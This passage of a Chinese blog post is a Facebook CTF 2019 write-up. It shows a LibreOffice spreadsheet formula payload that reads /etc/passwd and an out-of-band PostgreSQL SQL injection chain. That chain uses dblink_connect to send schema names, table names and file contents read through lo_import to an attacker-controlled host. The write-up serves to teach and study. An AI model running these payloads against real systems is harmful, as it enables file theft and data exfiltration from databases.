+<p>将<code>table:table-cell</code>这一部分进行替换，改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;table:table-cell </span><br><span class="line">     table:formula=&quot;of:=COM.MICROSOFT.WEBSERVICE(&amp;quot;/etc/passwd&amp;quot;)&quot; </span><br><span class="line">     office:value-type=&quot;string&quot; </span><br><span class="line">     office:string-value=&quot;&quot; </span><br><span class="line">     calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">  &lt;text:p&gt;#VALUE!&lt;/text:p&gt;</span><br><span class="line">&lt;/table:table-cell&gt;</span><br></pre></td></tr></table></figure></p>
+<p>得到：<br><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/passwd.png" alt=""><br>根据给出的用户，于是我们尝试查询<code>/home/libreoffice_admin/flag</code>,最终读到flag<br><img src="https://i.loli.net/2019/06/11/5cff3642cb56094273.png" alt=""></p>
+<h3 id="hr-admin-module"><a href="#hr-admin-module" class="headerlink" title="hr_admin_module"></a>hr_admin_module</h3><p>题目描述：</p>
+<blockquote>
+<p>While tying down the application the developer may have had trouble revoking the permission on one or two functions. Let’s hope this got sorted. At least he made sure the site feels really fast.</p>
+<p><a href="http://challenges.fbctf.com:8081" target="_blank" rel="noopener">http://challenges.fbctf.com:8081</a></p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/06/12/5d00bb9fc0c9c75902.png" alt=""><br>有两个搜索框，从error似乎给出了一些提示，数据库为<code>postgresql</code>，<code>user</code>框禁止了输入，于是尝试利用<code>employees</code>框，但没卵用，关注地址栏：<br><img src="https://i.loli.net/2019/06/12/5d00bc9e9c61624776.png" alt=""></p>
+<p>尝试将<code>employee</code>改为<code>user</code>，输入<code>admin&#39;</code>，奏效了，弹出warning：</p>
+<blockquote>
+<p>This is a warning alert—check it out!</p>
+</blockquote>
+<p>尝试输入<code>secret</code>，同样弹出上述警报<br>输入<code>admin%27--</code>，无警报</p>
+<p>fuzz一阵，会发现回显只有有无warning的区别，但尝试利用<code>pg_sleep</code>，返回结果没有时延，所以我们可以猜测后台是异步执行，且一般盲注不起效果</p>
+<p><strong>带外注入（OOB）：</strong></p>
+<blockquote>
+<p>带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用所谓的盲目(blind)的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功是基于防火墙出站规则的，即允许存在漏洞的系统和外围防火墙的出站请求</p>
+</blockquote>
+<p>我们大致有两种方式：</p>
+<ol>
+<li>dnslog，搭建dns服务器，将域名指向自己的服务器，利用dns进行解析，然后请求自己的二级或三级域名，在dns解析日志中去查看他们</li>
+<li>因为<code>dblink_connect</code>可用，我们可以尝试搭建一个<code>postgresql</code>服务，然后建立一个远程会话连接，连接到我们的<code>psql</code>服务，监听服务端口，查看请求包的明文信息</li>
+</ol>
+<p>第二个方法似乎更为简单</p>
+<p><code>dblink</code>是一个支持在一个数据库会话中连接到其他PostgreSQL数据库的模块。<br><code>dblink_connect</code> – 打开一个到远程数据库的持久连接</p>
+<p>在自己的服务器上安装<code>postgresql</code>，在配置文件<code>postgresql.conf</code>中设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen_addresses = &apos;*&apos;</span><br></pre></td></tr></table></figure></p>
+<p>利用tcpdump监听<code>5432</code>端口，查看请求包的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -nX -i eth0 port 5432</span><br></pre></td></tr></table></figure></p>
+<p>postgresql安装后默认用户为<code>postgres</code>，无密码，且有一个<code>postgres</code>的数据库，有意思的一点是，建议将密码或用户参数填写错误，因为这样才能返回查询信息</p>
+<p>修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=postgres password= dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
+<p>携带了连接信息：<br><img src="https://i.loli.net/2019/06/13/5d01fb1ee087f78253.png" alt=""></p>
+<p>列出schema：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(schema_name,&apos;:&apos;) FROM information_schema.schemata) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/06/13/5d01fbce5191773760.png" alt=""></p>
+<blockquote>
+<p>String_agg：有两个参数一个是需要合并的字段名称或者字面量，还有就是合并后以何种分隔符，即：string_agg(expression, delimiter)。</p>
+</blockquote>
+<p>列出当前schema的table：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(tablename, &apos;:&apos;) FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/06/13/5d01fd22325a750489.png" alt=""></p>
+<p>列出searches的行数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT COUNT(*) FROM searches) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
+<p>发现为空，说明没有内容<br>由于<code>pg_read_file</code>不能用，我们可以使用<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT lo_import(&apos;/var/lib/postgresql/data/secret&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/06/13/5d0201e048b8e69600.png" alt=""><br>成功了！！！</p>
+<p>每个文件都可以对应于一个oid<br>我们可以通过从pg_largeobject_metadata中提取来获取可用对象的oid列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(cast(l.oid as text), &apos;:&apos;) FROM pg_largeobject_metadata l) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/06/13/5d0202849d7c926302.png" alt=""></p>
+<p>我们尝试挨个读取，最终在<code>16444</code>读到了flag内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT convert_from(lo_get(16444), &apos;UTF8&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/06/13/5d0202971c8cd90441.png" alt=""></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://microvorld.com">damn1t</a>
+            <p>原文链接: <a href="http://microvorld.com/2019/06/12/CTF/fbctf2019/">http://microvorld.com/2019/06/12/CTF/fbctf2019/</a>
+            <p>发表日期: <a href="http://microvorld.com/2019/06/12/CTF/fbctf2019/">June 12th 2019, 1:27:45</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" title= MyBB <= 1.8.20--(From Stored XSS to RCE) >
+                    <div class="nextTitle">MyBB <= 1.8.20--(From Stored XSS to RCE)</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/06/06/CTF/qwb2019/" title= qwbctf2019 >
+                    <div class="prevTitle">qwbctf2019</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:870059622@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/microvorld" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/flatline" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Facebook-ctf-2019"><span class="toc-number">1.</span> <span class="toc-text">Facebook ctf 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rceservice"><span class="toc-number">1.1.1.</span> <span class="toc-text">rceservice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#events"><span class="toc-number">1.1.2.</span> <span class="toc-text">events</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#products-manager"><span class="toc-number">1.1.3.</span> <span class="toc-text">products manager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pdfme"><span class="toc-number">1.1.4.</span> <span class="toc-text">pdfme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hr-admin-module"><span class="toc-number">1.1.5.</span> <span class="toc-text">hr_admin_module</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 50 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span><a class="archive-post-title" href= "/2019/06/22/python/selenium学习笔记/" >selenium学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href= "/2019/06/21/python/Pyppeteer学习笔记/" >Pyppeteer学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/19</span><a class="archive-post-title" href= "/2019/06/19/vulnerable/Bypass XSS filters using JavaScript global variables/" >Bypass XSS filters using JavaScript global variables（笔记）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" >MyBB <= 1.8.20--(From Stored XSS to RCE)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/12</span><a class="archive-post-title" href= "/2019/06/12/CTF/fbctf2019/" >fbctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2019/06/06/CTF/qwb2019/" >qwbctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2019/05/25/OS/shell的重定向/" >Linux常用指令及其含义</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/29/python/python常见问题/" >python常见问题</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2019/05/09/vulnerable/intigriti xss challenge/" >Intigriti XSS Challenge - Solution and problem solving approach</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href= "/2019/05/07/靶机/FristiLeak/" >vulnhub--FristiLeaks v1.3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/04</span><a class="archive-post-title" href= "/2019/05/04/vulnerable/padding oracle attack/" >padding oracle</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2019/05/03/靶机/hack the box邀请码获取和web challenge/" >hack the box邀请码获取和web challenge</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href= "/2019/04/30/CTF/starctf2019/" >startctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2019/04/24/vulnerable/race condition/" >web条件竞争</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2019/04/23/图像/py_gif/" >python gif图的拆解和合成</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2019/04/21/CTF/ddctf2019/" >DDCTF2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2019/04/21/CTF/plaidctf2019/" >plaidctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2019/04/17/靶机/acid/" >acid server靶机渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2019/04/15/vulnerable/ssrf/" >ssrf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2019/04/11/cve/CVE-2018-17057/" >CVE-2018-17057</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2019/04/10/misc/png隐写/" >png文件结构与信息隐藏</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/11/vulnerable/jinja2/" >由Musee de X(强网杯2017)到jinja2模板注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/algorithm/傅里叶/" >傅里叶变换</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/图像/watermark/" >watermark resolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2019/04/08/CTF/MidnightSun CTF 2019/" >MidnightSun CTF 2019</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/20/web/Code-Breaking Puzzles/" >Code-Breaking Puzzles</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/03/29/OS/proc/" >linux /proc目录</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2019/04/01/CTF/fireshell ctf(vice)/" >fireshell ctf2019 vice</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/19/web/编码与解码/" >关于编码与解码的思考</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/2019/03/30/CTF/Securinets Prequals CTF 2019/" >Securinets Prequals CTF 2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2019/03/26/CTF/hackim ctf/" >hackim web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2019/03/25/vulnerable/xxe/" >xxe</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/2019/03/18/OS/linux常见问题/" >Linux常见错误</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2018/05/29/web/序列化/" >php反序列化漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2017/12/31/随笔/Create/" >To2018</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/vulnerable/cbc/" >CBC字节翻转攻击</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href= "/2017/12/04/随笔/无比芜杂的心绪/" >无比芜杂的心绪</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/08/pwn/pwnable1/" >pwnable.kr(1-2)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/13/转载/国外安全网站/" >分享一些国外著名的黑客技术学习网站</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/03/29/OS/command/" >常用指令及其含义(linux 和 windows)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/15/vulnerable/hash扩展攻击/" >hash长度扩展攻击</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/03/靶机/xss-quiz/" >XSS Challenges</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/01/靶机/leopold/" >leopold 靶机渗透</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/27/cpp/单双冒号区别/" >c++中冒号（:）和双冒号（::）的用法</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/03/CTF/VolgaCTF 2019(web)/" >VolgaCTF 2019 Quals</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/04/cve/CNVD-C-2019-48814/" >CNVD-C-2019-48814</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/20/python/upgrade python3/" >Ubuntu升级python3.7</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/12/cve/CVE-2018-8715/" >CVE-2018-8715</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/24/git相关/git使用/" >git基本使用</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
